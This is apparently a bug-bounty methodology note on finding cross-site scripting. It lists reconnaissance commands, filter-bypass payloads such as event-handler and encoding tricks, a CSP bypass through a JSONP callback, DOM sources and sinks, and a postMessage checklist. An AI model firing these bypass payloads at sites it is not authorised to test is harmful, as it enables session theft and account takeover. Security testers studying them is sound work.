> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/hunting/00-index|← Back to Hunting]] · Related: [[../../bypass/02-xss-bypass|XSS bypass]] · [[../../tools/02-xss|XSS tools]]

# XSS

Reflected XSS, DOM XSS, Stored XSS — as chain material only.

## Reflected XSS — Find the Reflection

- Burp "Reflector" extension
- `x8 -w params -u https://target.com/path -X GET POST`
- Wayback: `waybackurls target.com | unfurl keys | sort -u` then probe each

Test in MANY endpoints, not just one.

## Bypass Techniques (in order)

**Encoding**:
- Double URL-encode
- HTML-encode: `&#xHEX;`, `&#DEC;`, `&lt;`
- Mix encoding layers

**Filter-bypass event handlers**:
- `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<body onload=>`, `<marquee onstart=>`
- `onmouseover`, `ondragover`, `onclick`, `onfocus`, `onpointerover`

**JS execution when functions filtered**:
- `location=location.hash.split('#')[1]`
- `onerror=eval(\`'+\`URL)` → fragment-based
- Unicode escapes: `\u0061`, `\u00000061`
- Optional chaining: `alert?.(1)`

**CSP bypass**:
- `script-src youtube.com` → `<script src="https://youtube.com/oembed?url=...&callback=alert(1)">`
- File-upload + CSP allows origin → upload `.html`/`.svg`

## DOM XSS

**Sources**: `location.search`, `location.hash`, `document.referrer`, `window.name`, `postMessage`, `localStorage`

**Sinks**: `document.write`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `eval`, `setTimeout`, `setInterval`, `Function()`, `location=`, jQuery: `.html()`, `.append()`, `$()`

## PostMessage

Use DOM Invader. For each `addEventListener("message"`:
1. Can you control `data` / `event.data`?
2. Does it check `event.origin`? Bypassable?
3. What's the sink?
4. Test from foreign origin.
